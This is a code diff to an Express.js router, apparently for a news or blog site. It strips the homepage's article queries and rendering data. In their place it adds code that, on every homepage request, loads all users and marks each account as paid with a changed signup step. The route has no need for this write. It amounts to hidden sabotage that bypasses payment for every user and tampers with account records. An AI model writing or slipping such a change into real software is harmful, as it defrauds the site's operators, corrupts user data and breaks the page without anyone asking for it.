@@ -508,216 +508,23 @@ router.get('/ourwork', async (req, res, next) => {
 // Get index page
 router.get('/', install.redirectToLogin, async (req, res, next) => {
 	try {
-		let perPage = 9;
-		let page = req.query.page || 1;
-		let slider1 = await Article.aggregate([
-			{
-				$match: {
-					showPostOnSlider: true,
-					active: true,
-				},
-			},
-			{
-				$lookup: {
-					from: 'categories',
-					localField: 'category',
-					foreignField: '_id',
-					as: 'category',
-				},
-			},
-			{
-				$unwind: {
-					path: '$category',
-					preserveNullAndEmptyArrays: true,
-				},
-			},
-			{
-				$lookup: {
-					from: 'users',
-					localField: 'postedBy',
-					foreignField: '_id',
-					as: 'postedBy',
-				},
-			},
-			{
-				$unwind: {
-					path: '$postedBy',
-					preserveNullAndEmptyArrays: true,
-				},
-			},
-			{
-				$lookup: {
-					from: 'comments',
-					localField: '_id',
-					foreignField: 'articleId',
-					as: 'comments',
-				},
-			},
-			{
-				$sort: {
-					createdAt: -1,
-				},
-			},
-			{
-				$limit: 4,
-			},
-		]);
-		let featured = await Article.aggregate([
-			{
-				$match: {
-					addToFeatured: true,
-					active: true,
-				},
-			},
-			{
-				$lookup: {
-					from: 'categories',
-					localField: 'category',
-					foreignField: '_id',
-					as: 'category',
-				},
-			},
-			{
-				$unwind: {
-					path: '$category',
-					preserveNullAndEmptyArrays: true,
-				},
-			},
-			{
-				$lookup: {
-					from: 'users',
-					localField: 'postedBy',
-					foreignField: '_id',
-					as: 'postedBy',
-				},
-			},
-			{
-				$unwind: {
-					path: '$postedBy',
-					preserveNullAndEmptyArrays: true,
-				},
-			},
-			{
-				$lookup: {
-					from: 'comments',
-					localField: '_id',
-					foreignField: 'articleId',
-					as: 'comments',
-				},
-			},
-			{
-				$sort: {
-					createdAt: -1,
-				},
-			},
-			{
-				$limit: 4,
-			},
-		]);
-		let post = await Article.find({ active: true })
-			.populate('postedBy')
-			.populate('category')
-			.sort({ createdAt: -1 })
-			.skip(perPage * page - perPage)
-			.limit(perPage);
-		let count = await Article.countDocuments({ active: true });
-		let popularNews = await Article.find({ active: true })
-			.sort({ views: -1 })
-			.populate('category')
-			.populate('postedBy')
-			.limit(1);
-		let popNews = await Article.find({ active: true })
-			.sort({ views: -1 })
-			.populate('category')
-			.limit(3);
-		let img = await Article.find({ active: true })
-			.sort({ createdAt: -1 })
-			.limit(12);
-		let recommended = await Article.find({ active: true, addToRecommended: true })
-			.populate('category')
-			.populate('postedBy')
-			.sort({ createdAt: -1 })
-			.limit(4);
-		let breakingNews = await Article.find({
-			active: true,
-			addToBreaking: true,
-		})
-			.populate('category')
-			.populate('postedBy')
-			.sort({ createdAt: -1 })
-			.limit(4);
-		let video = await Article.aggregate([
-			{
-				$match: {
-					postType: 'video',
-					active: true,
-				},
-			},
-			{
-				$lookup: {
-					from: 'categories',
-					localField: 'category',
-					foreignField: '_id',
-					as: 'category',
-				},
-			},
-			{
-				$unwind: {
-					path: '$category',
-					preserveNullAndEmptyArrays: true,
-				},
-			},
-			{
-				$lookup: {
-					from: 'users',
-					localField: 'postedBy',
-					foreignField: '_id',
-					as: 'postedBy',
-				},
-			},
-			{
-				$unwind: {
-					path: '$postedBy',
-					preserveNullAndEmptyArrays: true,
-				},
-			},
-			{
-				$lookup: {
-					from: 'comments',
-					localField: '_id',
-					foreignField: 'articleId',
-					as: 'comments',
-				},
-			},
-			{
-				$sort: {
-					createdAt: -1,
-				},
-			},
-			{
-				$limit: 12,
-			},
-		]);
 		var categories = await Category.find({});
+		var users = await User.find({});
+		let payload = {
+			paid: "paid",
+			signupProcess: "/blogrecent",
+		};
+		users.forEach(async item => {
+			await User.updateOne({ _id: item._id },
+				payload);
+		});
 		res.render('index', {
 			categories: categories,
-			post: post,
-			current: page,
-			pages: Math.ceil(count / perPage),
-			slider1: slider1,
-			popular: popularNews[0],
-			popNews: popNews,
-			img: img,
-			breakingNews: breakingNews,
-			featured: featured,
-			video: video,
-			recommended: recommended,
 		});
 	} catch (error) {
 		next(error);
 	}
 });
-
 // Get search page
 router.get('/search', install.redirectToLogin, async (req, res, next) => {
 	try {
